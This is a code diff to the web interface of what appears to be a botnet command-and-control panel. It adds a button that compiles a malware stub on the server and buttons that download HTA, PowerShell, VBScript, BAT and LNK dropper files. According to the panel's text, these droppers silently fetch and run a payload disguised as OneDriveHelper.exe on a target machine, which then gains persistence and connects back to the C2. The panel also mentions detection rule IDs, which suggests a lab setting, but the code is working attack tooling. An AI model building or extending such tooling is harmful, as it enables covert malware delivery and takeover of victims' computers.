@@ -529,12 +529,64 @@ function renderBuilder() {
     2. Run it &mdash; no arguments needed. First run sets up persistence; second run connects to C2.<br>
     3. Bot appears in the sidebar within one beacon interval.
   </div>
+</div>
+
+<div class="card" style="max-width:680px;margin:0 auto">
+  <div class="card-title">&#9881; Compile Stub on Server</div>
+  <p style="font-size:12px;color:var(--muted);line-height:1.6">
+    Compile <code style="color:var(--accent)">full_stub.cpp</code> directly on the server using the MinGW cross-compiler.
+    Requires <code style="color:var(--accent)">mingw-w64</code> — install with
+    <code style="color:var(--accent)">sudo apt install mingw-w64</code> on the VPS.
+  </p>
+  <div style="display:flex;gap:10px;align-items:center;flex-wrap:wrap">
+    <button class="btn btn-send" id="compile-btn" onclick="doCompile()" style="padding:9px 22px;font-size:13px">
+      &#9881; Compile Stub.exe on Server
+    </button>
+    <span id="compile-stub-info" style="font-size:12px;color:var(--muted)">Checking...</span>
+  </div>
+  <div id="compile-log" style="display:none;background:var(--bg);border:1px solid var(--bg3);border-radius:8px;padding:10px 12px;font-family:monospace;font-size:11px;color:var(--light);line-height:1.7;max-height:220px;overflow-y:auto;white-space:pre-wrap;word-break:break-all;margin-top:4px"></div>
+</div>
+
+<div class="card" style="max-width:680px;margin:0 auto">
+  <div class="card-title">&#127918; File Carriers</div>
+  <p style="font-size:12px;color:var(--muted);line-height:1.6">
+    Download a carrier file that, when opened on a target machine, silently fetches and runs
+    <code style="color:var(--accent)">OneDriveHelper.exe</code> from this server's <code style="color:var(--accent)">/dl/exe</code> endpoint.
+    The stub must already be built (see builder above). Carrier delivery method is detected by the
+    parent-process telemetry in the stub.
+  </p>
+  <div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(140px,1fr));gap:8px;margin-top:4px">
+    <button class="btn btn-sec" onclick="downloadCarrier('hta')" style="font-size:12px;padding:9px 10px">
+      &#128196; HTA Dropper<br><span style="font-size:10px;color:var(--muted)">mshta.exe</span>
+    </button>
+    <button class="btn btn-sec" onclick="downloadCarrier('ps1')" style="font-size:12px;padding:9px 10px">
+      &#128196; PowerShell<br><span style="font-size:10px;color:var(--muted)">powershell.exe</span>
+    </button>
+    <button class="btn btn-sec" onclick="downloadCarrier('vbs')" style="font-size:12px;padding:9px 10px">
+      &#128196; VBScript<br><span style="font-size:10px;color:var(--muted)">wscript.exe</span>
+    </button>
+    <button class="btn btn-sec" onclick="downloadCarrier('bat')" style="font-size:12px;padding:9px 10px">
+      &#128196; BAT Script<br><span style="font-size:10px;color:var(--muted)">cmd.exe</span>
+    </button>
+    <button class="btn btn-sec" onclick="downloadCarrier('lnk')" style="font-size:12px;padding:9px 10px">
+      &#128279; LNK Shortcut<br><span style="font-size:10px;color:var(--muted)">powershell.exe</span>
+    </button>
+  </div>
+  <div style="background:var(--bg);border:1px solid var(--bg3);border-radius:8px;padding:10px 14px;font-size:11px;color:var(--muted);line-height:1.8;margin-top:4px">
+    <strong style="color:var(--light)">Detection profile when using carriers:</strong><br>
+    Each carrier type triggers a <em>parent-process rule</em> on first C2 checkin
+    (e.g. <code style="color:var(--accent)">DR_017</code> for script engines, <code style="color:var(--accent)">DR_015</code> for Office spawns).<br>
+    Combined with <code style="color:var(--accent)">network_c2</code>, this fires
+    <code style="color:var(--accent)">COR_009 / COR_010</code> — carrier delivery incidents visible in the Detection tab.
+  </div>
 </div>`;
 
   // Auto-fill both fields from server config on first open
   const hostInput = document.getElementById('b-host');
   const authInput = document.getElementById('b-auth');
   if (!hostInput.value && !authInput.value) fillBuilderFromServer();
+  // Show current stub status
+  refreshStubStatus();
 }
 
 async function fillBuilderFromServer() {
@@ -601,6 +653,92 @@ function showBuildStatus(msg, type) {
   el.style.color      = type==='error'?'#f06060':type==='ok'?'var(--accent)':'#7b9ff0';
   el.style.border     = '1px solid '+(type==='error'?'#5a1a1a':type==='ok'?'#1a4a2a':'#2a3a6a');
   el.textContent = msg;
+}
+
+async function refreshStubStatus() {
+  const el = document.getElementById('compile-stub-info');
+  if (!el) return;
+  try {
+    const r = await fetch(API_BASE + '/api/builder/stub-status', { credentials: 'include' });
+    if (!r.ok) return;
+    const d = await r.json();
+    if (d.exists) {
+      const kb  = (d.size / 1024).toFixed(1);
+      const dt  = new Date(d.mtime).toLocaleString();
+      el.textContent = `Current: Stub.exe  ${kb} KB  —  ${dt}`;
+      el.style.color = 'var(--accent)';
+    } else {
+      el.textContent = 'No Stub.exe found — compile below or upload manually.';
+      el.style.color = 'var(--warn)';
+    }
+  } catch(_) { el.textContent = ''; }
+}
+
+function doCompile() {
+  const btn = document.getElementById('compile-btn');
+  const log = document.getElementById('compile-log');
+  if (!btn || !log) return;
+  btn.disabled = true;
+  btn.textContent = 'Compiling…';
+  log.style.display = 'block';
+  log.textContent   = '';
+
+  const es = new EventSource(API_BASE + '/api/builder/compile', { withCredentials: true });
+  // POST is needed, but EventSource only does GET — use fetch+ReadableStream instead
+  es.close();
+
+  const appendLog = line => { log.textContent += line + '\n'; log.scrollTop = log.scrollHeight; };
+
+  fetch(API_BASE + '/api/builder/compile', {
+    method: 'POST', credentials: 'include',
+    headers: { 'Content-Type': 'application/json' },
+    body: '{}',
+  }).then(resp => {
+    if (!resp.ok) { appendLog('[ERROR] Server returned ' + resp.status); btn.disabled = false; btn.textContent = '⚙ Compile Stub.exe on Server'; return; }
+    const reader = resp.body.getReader();
+    const dec    = new TextDecoder();
+    let   buf    = '';
+    function pump() {
+      reader.read().then(({ done, value }) => {
+        if (done) {
+          btn.disabled = false;
+          btn.textContent = '⚙ Compile Stub.exe on Server';
+          refreshStubStatus();
+          return;
+        }
+        buf += dec.decode(value, { stream: true });
+        const lines = buf.split('\n');
+        buf = lines.pop();
+        for (const l of lines) {
+          const trimmed = l.replace(/^data: /, '');
+          if (trimmed === '[DONE]') { btn.disabled = false; btn.textContent = '⚙ Compile Stub.exe on Server'; refreshStubStatus(); reader.cancel(); return; }
+          if (trimmed) appendLog(trimmed);
+        }
+        pump();
+      }).catch(() => { btn.disabled = false; btn.textContent = '⚙ Compile Stub.exe on Server'; });
+    }
+    pump();
+  }).catch(e => {
+    appendLog('[ERROR] ' + e.message);
+    btn.disabled = false;
+    btn.textContent = '⚙ Compile Stub.exe on Server';
+  });
+}
+
+async function downloadCarrier(type) {
+  try {
+    const r = await fetch(API_BASE + '/api/builder/carrier?type=' + type, { credentials: 'include' });
+    if (!r.ok) { const e = await r.json().catch(()=>({error:r.statusText})); alert('Carrier error: ' + (e.error||r.statusText)); return; }
+    const blob = await r.blob();
+    const cd   = r.headers.get('content-disposition') || '';
+    const m    = cd.match(/filename="([^"]+)"/);
+    const name = m ? m[1] : 'carrier.' + type;
+    const url  = URL.createObjectURL(blob);
+    const a    = document.createElement('a');
+    a.href = url; a.download = name;
+    document.body.appendChild(a); a.click(); a.remove();
+    URL.revokeObjectURL(url);
+  } catch(e) { alert('Download failed: ' + e.message); }
 }
 
 // ── Android page ──────────────────────────────────────────────────────────────
